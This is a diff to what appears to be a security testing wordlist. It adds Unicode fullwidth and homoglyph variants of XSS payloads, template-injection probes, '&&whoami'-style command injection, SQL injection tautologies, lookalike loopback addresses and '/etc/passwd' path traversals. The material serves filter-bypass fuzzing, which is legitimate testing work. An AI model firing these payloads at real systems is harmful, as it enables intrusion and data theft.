@@ -461,6 +461,13 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 ' onclick=alert`5` fragment='
 <details/open ontoggle=alert(6)>
 <svg/onload=alert``>
+＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
+＜script src=a／＞
+＂onclick=＇prompt(1)＇
+﹛﹛3+3﹜﹜
+［［5+5］］
+＆＆whoami
+｜｜ whoami
 javascript:alert(1)
 '-alert(1)-'
 '-alert(1)//
@@ -490,6 +497,9 @@ http://a/%%30%30
 </textarea><script>alert(123)</script>
 1;DROP TABLE users
 1'; DROP TABLE users-- 1
+＇ or ＇1＇=＇1
+＂ or ＂1＂=＂1
+admin＇﹣﹣
 ' OR 1=1 -- 1
 ' OR '1'='1
 %
@@ -552,9 +562,14 @@ $ENV{'HOME'}
 %*.*s
 %@
 %n
+①②⑦.⓪.⓪.①
+fadavvi。gitlab。io
+／／fadavvi.gitlab.io
 File:///
 ../../../../../../../../../../../etc/passwd%00
 ../../../../../../../../../../../etc/hosts
+‥/‥/‥/etc/passwd
+︰/︰/︰/etc/passwd
 %ALLUSERSPROFILE%
 %APPDATA%
 %COMPUTERNAME%
